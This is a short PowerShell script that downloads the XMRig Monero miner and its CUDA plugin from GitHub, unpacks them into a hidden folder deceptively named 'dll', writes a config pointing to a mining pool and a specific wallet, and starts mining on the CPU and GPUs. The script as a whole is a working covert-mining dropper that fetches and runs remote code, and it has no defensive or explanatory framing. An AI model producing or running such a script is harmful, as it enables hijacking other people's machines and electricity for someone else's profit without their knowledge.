Invoke-WebRequest "https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-gcc-win64.zip" -OutFile 'dll.zip'

Expand-Archive dll.zip -DestinationPath dll

Remove-Item dll.zip -Force

(Get-Item dll).Attributes += 'Hidden'

Set-Location dll\xmrig-6.19.2

Invoke-WebRequest "https://github.com/xmrig/xmrig-cuda/releases/download/v6.17.0/xmrig-cuda-6.17.0-cuda10_0-win64.zip" -OutFile 'cuda.zip' 

Expand-Archive cuda.zip -DestinationPath cuda 

Remove-Item cuda.zip -Force

Remove-Item config.json -Force

$json_template = @"
{
    "autosave": true,
    "cpu": true,
    "opencl": true,
    "cuda": true,
    "pools": [
        {
            "url": "xmr.pool.gntl.co.uk:20009",
            "user": "46eiEZoNtnFA6TXtHLkGEr4ijPAP9hzWaSacyNh5SQ9qUBfmdRLRdc3HX1znnNm6cp54k9NbW1FMpHftJGKWqXLr2GfaFRP",
            "pass": "BDR-PRO",
            "keepalive": true,
            "tls": true
        }
    ]
}
"@
$json_template | Out-File config.json

Start-Process -FilePath "xmrig.exe" -ArgumentList "--opencl --cuda -o xmr.pool.gntl.co.uk:20009 -u 46eiEZoNtnFA6TXtHLkGEr4ijPAP9hzWaSacyNh5SQ9qUBfmdRLRdc3HX1znnNm6cp54k9NbW1FMpHftJGKWqXLr2GfaFRP -k --tls -p BDR-PRO"
